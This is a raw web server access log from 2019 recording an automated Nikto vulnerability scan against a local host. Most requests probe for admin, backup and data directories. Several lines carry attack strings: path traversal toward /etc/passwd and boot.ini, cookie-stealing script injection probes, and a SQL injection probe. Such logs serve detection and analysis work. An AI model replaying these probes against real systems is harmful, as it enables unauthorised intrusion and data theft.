172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /iissamples/issamples/oop/qfullhit.htw?CiWebHitsFile=/iissamples/issamples/oop/qfullhit.htw&CiRestriction=none&CiHiliteType=Full HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001465)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /iissamples/issamples/oop/qsumrhit.htw?CiWebHitsFile=/iissamples/issamples/oop/qsumrhit.htw&CiRestriction=none&CiHiliteType=Full HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001466)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /null.htw?CiWebHitsFile=/default.asp%20&CiRestriction=none&CiHiliteType=Full HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001467)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001468)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../boot.ini HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001469)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../etc/passwd HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001470)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /%3f.jsp HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001472)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /%3f.jsp HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001473)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /msadc/msadcs.dll HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001474)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET ../../../../../../../../../../etc/* HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001475)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET ../../../../../../../../../../etc/passw* HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001476)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /bytehoard/index.php?infolder=../../../../../../../../../../../etc/ HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001477)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Search HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001478)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /musicqueue.cgi HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001479)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /scripts/tools/newdsn.exe HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001481)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /OpenFile.aspx?file=../../../../../../../../../../boot.ini HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001482)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?vo=\\\"><script>alert(document.cookie);</script> HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001487)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /.../.../.../.../.../.../.../.../.../.../etc/passwd HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001488)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin/database/wwForum.mdb HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001490)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /../config.dat HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001491)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /iisadmpwd/aexp2.htr HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001492)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /iisadmpwd/aexp2b.htr HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001493)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /iisadmpwd/aexp3.htr HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001494)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /iisadmpwd/aexp4.htr HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001495)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /iisadmpwd/aexp4b.htr HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001496)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET //admin/aindex.htm HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001497)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /shopping/shopdisplayproducts.asp?id=1&cat=<script>alert('test')</script> HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001503)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET shopdisplayproducts.asp?id=1&cat=<script>alert(document.cookie)</script> HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001504)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin/wg_user-info.ml HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001505)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /banners.php?op=EmailStats&cid=1%20AND%20passwd%20LIKE%20'a%'/* HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001506)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /c32web.exe/ChangeAdminPassword HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001507)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /showmail.pl HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001508)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /reademail.pl HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001509)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /showmail.pl?Folder=<script>alert(document.cookie)</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001510)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /iissamples/exair/search/query.asp HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001511)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?showforum=1&prune_day=100&sort_by=Z-A&sort_key=[sqlgoeshere] HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001512)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?offset=[%20Problem%20Here%20] HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001513)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /buddies.blt HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001514)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /buddy.blt HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001515)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /buddylist.blt HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001516)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /pdf/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001532)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /sqlnet.log HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001533)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /.psql_history HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001535)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /acceso/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001536)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /access-log HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001537)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /access.log HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001538)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /access/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001539)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /access_log HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001540)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /acciones/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001541)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /account/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001542)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /accounting/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001543)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /activex/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001544)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /adm/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001545)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin.htm HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001546)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin.html HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001547)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin.php HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001548)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin.php3 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001549)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin.shtml HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001550)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001551)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Administration/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001552)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /administration/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001553)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /administrator/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001554)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Admin_files/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001555)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /advwebadmin/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001556)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Agent/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001557)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Agentes/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001558)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /agentes/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001559)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Agents/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001560)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /analog/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001561)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /apache/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001562)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /app/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001563)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /applicattion/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001564)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /applicattions/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001565)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /apps/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001566)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /archivar/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001567)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /archive/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001568)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /archives/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001569)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /archivo/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001570)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /asp/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001571)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Asp/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001572)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /atc/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001573)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /auth/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001574)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /awebvisit.stat HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001575)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ayuda/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001576)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /backdoor/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001577)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /backup/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001578)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /bak/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001579)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /banca/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001580)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /banco/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001581)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /bank/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001582)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /bbv/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001583)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /bdata/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001584)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /bdatos/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001585)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /beta/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001586)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /bin/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001587)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /boot/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001588)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /buy/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001589)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /buynow/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001590)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /c/ HTTP/1.1" 404 493 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001591)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cache-stats/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001592)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /caja/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001593)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /card/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001594)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cards/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001595)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cart/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001596)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cash/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001597)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ccard/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001598)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ccbill/secure/ccbill.log HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001599)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cdrom/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001601)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cert/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001602)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /certificado/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001603)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /certificate HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001604)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /certificates HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001605)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cfdocs/exampleapp/email/application.cfm HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001606)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cfdocs/exampleapp/publish/admin/addcontent.cfm HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001607)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cfdocs/exampleapp/publish/admin/application.cfm HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001608)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cfdocs/examples/httpclient/mainframeset.cfm HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001609)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /client/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001612)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cliente/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001613)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /clientes/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001614)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /clients/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001615)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /code/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001617)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /communicator/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001618)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /compra/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001619)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /compras/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001620)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /compressed/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001621)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /conecta/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001622)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /config/ HTTP/1.1" 200 1394 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001623)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /config/checks.txt HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001624)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /connect/ HTTP/1.1" 404 463 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001625)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /console HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001626)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /correo/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001627)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /counter/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001628)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /credit/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001629)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /crypto/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001630)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /css HTTP/1.1" 404 494 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001631)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cuenta/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001632)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cuentas/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001633)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /customers/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001634)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dan_o.dat HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001635)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dat/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001636)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /data/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001637)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dato/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001638)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /datos/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001639)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /db/ HTTP/1.1" 404 494 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001640)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dbase/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001641)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /demo/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001642)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /demos/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001643)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dev/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001644)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /devel/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001645)"
